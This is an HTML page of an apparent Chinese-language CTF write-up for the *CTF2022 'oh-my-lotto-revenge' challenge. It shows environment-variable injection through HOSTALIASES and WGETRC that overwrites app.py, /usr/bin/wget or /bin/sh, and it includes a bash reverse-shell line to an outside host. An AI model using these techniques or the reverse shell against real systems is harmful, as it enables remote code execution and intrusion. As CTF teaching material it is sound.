@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[*CTF2022] oh-my-lotto-revenge - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[*CTF2022] oh-my-lotto-revenge" />
+<meta property="og:description" content="New 相对于oh_my_lotto ，revenge进行了下面的更改 这么做，我们能走的就只有RCE了，而这里唯一能操作的一个地方就是这里，可以操作" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/ctf2022_oh-my-lotto-revenge/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-20T18:24:27+08:00" />
+<meta property="article:modified_time" content="2022-04-20T18:24:27+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="[*CTF2022] oh-my-lotto-revenge"/>
+<meta name="twitter:description" content="New 相对于oh_my_lotto ，revenge进行了下面的更改 这么做，我们能走的就只有RCE了，而这里唯一能操作的一个地方就是这里，可以操作"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/ctf2022_oh-my-lotto-revenge/" /><link rel="prev" href="https://example.com/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/" /><link rel="next" href="https://example.com/mrctf2022_wp/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[*CTF2022] oh-my-lotto-revenge",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/ctf2022_oh-my-lotto-revenge\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1460 ,
+        "url": "https:\/\/example.com\/ctf2022_oh-my-lotto-revenge\/","datePublished": "2022-04-20T18:24:27+08:00","dateModified": "2022-04-20T18:24:27+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/ctf2022_oh-my-lotto-revenge/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/ctf2022_oh-my-lotto-revenge/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[*CTF2022] oh-my-lotto-revenge</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
+</span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-04-20">2022-04-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1460 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#new">New</a></li>
+        <li><a href="#intented-writeup">Intented writeup</a></li>
+        <li><a href="#unintented-writeup">Unintented writeup</a>
+          <ul>
+            <li><a href="#0x01">0x01</a></li>
+            <li><a href="#0x02">0x02</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="new">New</h2>
+<p>相对于<a href="https://www.huamang.xyz/index.php/archives/152/#h2ZAoFX0WCRWOf64MY" target="_blank" rel="noopener noreffer">oh_my_lotto</a>
+，revenge进行了下面的更改</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220419222428531.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220419222428531.png, https://tuchuang.huamang.xyz/img/image-20220419222428531.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220419222428531.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220419222428531.png"
+        title="image-20220419222428531" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220419222450446.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220419222450446.png, https://tuchuang.huamang.xyz/img/image-20220419222450446.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220419222450446.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220419222450446.png"
+        title="image-20220419222450446" /></p>
+<p>这么做，我们能走的就只有RCE了，而这里唯一能操作的一个地方就是这里，可以操作环境变量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="n">lotto_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">lotto_value</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里有几个非预期解，先看看预期解</p>
+<h2 id="intented-writeup">Intented writeup</h2>
+<p>这里可以操控环境变量，那么我们能做的事情就很多了，预期解是操控<code>HOSTALIASES</code>修改hosts</p>
+<p>因为他的wget是通过域名下载的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;wget --content-disposition -N lotto&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们把伪造的hosts文件通过forecast路由传到服务器，然后修改环境变量把hosts指向<code>/app/guess/forecast.txt</code></p>
+<p>剩下的就是如何利用了，可以发现wget的参数是<code>--content-disposition -N</code></p>
+<p>对于这个参数的意义，我在谷歌找到了如下定义：他是可以由服务器端决定下载的文件，-N表示文件名不变进行覆盖</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220419232146985.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220419232146985.png, https://tuchuang.huamang.xyz/img/image-20220419232146985.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220419232146985.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220419232146985.png"
+        title="image-20220419232146985" />、</p>
+<p>这样的话，我们就可以操控他下载的文件，去进行覆盖app.py</p>
+<p>我查找了这个http头的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition#%E4%BD%9C%E4%B8%BA%E6%B6%88%E6%81%AF%E4%B8%BB%E4%BD%93%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E5%A4%B4" target="_blank" rel="noopener noreffer">语法</a>
+</p>
+<p>我们只需要在http头指定app.py即可把恶意的app.py覆盖掉源文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220419232610529.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220419232610529.png, https://tuchuang.huamang.xyz/img/image-20220419232610529.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220419232610529.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220419232610529.png"
+        title="image-20220419232610529" /></p>
+<p>这样的话我们就可以编写如下poc</p>
+<p>app.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">import flask
+import os
+
+app = flask.Flask(__name__)
+@app.route(&#34;/rce&#34;)
+def rce():
+    return str(os.popen(&#39;env&#39;).read())
+
+if __name__ == &#34;__main__&#34;:
+    app.run(debug=True,host=&#39;0.0.0.0&#39;, port=8080)
+</code></pre></td></tr></table>
+</div>
+</div><p>main.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">import flask
+import os
+
+app = flask.Flask(__name__)
+@app.route(&#34;/&#34;)
+def index():
+    with open(&#39;app.py&#39;,&#39;rb&#39;) as f:
+        res = f.read()
+    r = flask.make_response(res)
+    response.headers[&#39;Content-Type&#39;] = &#39;text/plain&#39;
+    response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=app.py&#39;
+    return response
+
+if __name__ == &#34;__main__&#34;:
+    app.run(debug=True,host=&#39;0.0.0.0&#39;, port=8899)
+</code></pre></td></tr></table>
+</div>
+</div><p>在服务器启动main.py，然后上传伪造hosts文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"># hosts
+lotto domain
+</code></pre></td></tr></table>
+</div>
+</div><p>然后在lotto页面修改环境变量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">HOSTALIASES
+/app/guess/forecast.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420000125065.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420000125065.png, https://tuchuang.huamang.xyz/img/image-20220420000125065.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420000125065.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420000125065.png"
+        title="image-20220420000125065" /></p>
+<p>然后在服务器添加反代，把8899端口转发到80端口</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420010655831.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420010655831.png, https://tuchuang.huamang.xyz/img/image-20220420010655831.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420010655831.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420010655831.png"
+        title="image-20220420010655831" /></p>
+<p>可以发现app.py成功被覆盖</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420011927033.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420011927033.png, https://tuchuang.huamang.xyz/img/image-20220420011927033.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420011927033.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420011927033.png"
+        title="image-20220420011927033" /></p>
+<p>但是发现他还是原来的服务</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420012154011.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420012154011.png, https://tuchuang.huamang.xyz/img/image-20220420012154011.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420012154011.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420012154011.png"
+        title="image-20220420012154011" /></p>
+<p>是因为服务是gunicorn搭建起来的，他更新py文件以后不会实时更新，而gunicorn有一个<code>pre-forked worker</code>机制，当某个worker超时以后，就会让gunicorn重启该worker</p>
+<p>我们可以抓包进行爆破服务让他崩溃重启</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420012722538.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420012722538.png, https://tuchuang.huamang.xyz/img/image-20220420012722538.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420012722538.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420012722538.png"
+        title="image-20220420012722538" /></p>
+<p>崩溃后，成功拿到flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420012625604.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420012625604.png, https://tuchuang.huamang.xyz/img/image-20220420012625604.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420012625604.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420012625604.png"
+        title="image-20220420012625604" /></p>
+<p>预期解至此</p>
+<h2 id="unintented-writeup">Unintented writeup</h2>
+<p>非预期解，这里我只知道一直就是利用<code>WGETRC</code>，配合<code>http_proxy</code>和<code>output_document</code>，覆盖本地的wget应用，然后利用wget完成RCE</p>
+<p>查<a href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html" target="_blank" rel="noopener noreffer">官方文档</a>
+可知，wget会找环境变量WGETRC，加载wgetrc文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420015237967.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420015237967.png, https://tuchuang.huamang.xyz/img/image-20220420015237967.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420015237967.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420015237967.png"
+        title="image-20220420015237967" /></p>
+<p>而具体利用wgetrc就是看这篇<a href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html" target="_blank" rel="noopener noreffer">官方文档</a>
+</p>
+<p>这样的话，就是通过上传我们构造的wgetrc去进行攻击</p>
+<p>这里注意了这几个配置项</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"># 把记录写到file里
+output_document = file
+		Set the output filename—the same as ‘-O file’.
+
+# 设置HTTP代理
+http_proxy = string
+Use string as HTTP proxy, instead of the one specified in environment.
+</code></pre></td></tr></table>
+</div>
+</div><p>我在本机测试了一下，设置了http_proxy以后，wget下载的都是代理服务器的文件</p>
+<p>通过这个代理服务器，我们可以通过修改代理服务器的东西去修改返回值，然后利用output_document进行覆盖</p>
+<h3 id="0x01">0x01</h3>
+<p>因为我们只能执行wget，所以我们直接索性覆盖wget</p>
+<p>构造如下wgetrc文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">output_document = /usr/bin/wget
+http_proxy = test.huamang.xyz
+https_proxy = test.huamang.xyz
+</code></pre></td></tr></table>
+</div>
+</div><p>在代理服务器开一个80端口的web服务，写着反弹shell的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>bash -c <span class="s2">&#34;bash -i &lt; /dev/tcp/10.211.55.4/8888 1&lt;&amp;0 2&lt;&amp;0&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420021548280.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420021548280.png, https://tuchuang.huamang.xyz/img/image-20220420021548280.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420021548280.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420021548280.png"
+        title="image-20220420021548280" /></p>
+<p>把文件传上去，然后去lotto路由修改<code>WGETRC</code>的值为<code>/app/guess/forecast.txt</code></p>
+<p>然后触发wget命令，拿到flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420031942691.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420031942691.png, https://tuchuang.huamang.xyz/img/image-20220420031942691.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420031942691.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420031942691.png"
+        title="image-20220420031942691" /></p>
+<p>但是这个方法不够优雅，会覆盖掉wget，让其他选手没有体验感</p>
+<h3 id="0x02">0x02</h3>
+<p>WGETRC还有一个参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use_askpass=/bin/xxx
+</code></pre></td></tr></table>
+</div>
+</div><p>通过这个参数可以直接执行二进制文件，但是wget下载的文件，是没有x权限的，无法执行</p>
+<p>所以我们可以通过覆盖掉/bin/sh后（题目使用的是/usr/bin/），再利用这个参数去执行他</p>
+<p>所以具体步骤是：</p>
+<p>首先上传如下文件，覆盖掉可以执行文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">output_document = /bin/sh
+http_proxy = test.huamang.xyz
+https_proxy = test.huamang.xyz
+</code></pre></td></tr></table>
+</div>
+</div><p>然后上传use_askpass参数去执行命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use_askpass=/bin/sh
+</code></pre></td></tr></table>
+</div>
+</div><p>成功RCE</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220420034358312.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220420034358312.png, https://tuchuang.huamang.xyz/img/image-20220420034358312.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220420034358312.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220420034358312.png"
+        title="image-20220420034358312" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-04-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/" class="prev" rel="prev" title="校赛CTFd平台docker搭建—pixo主题"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>校赛CTFd平台docker搭建—pixo主题</a>
+            <a href="/mrctf2022_wp/" class="next" rel="next" title="[MRCTF2022] WP">[MRCTF2022] WP<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">赣ICP备2021001334号</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
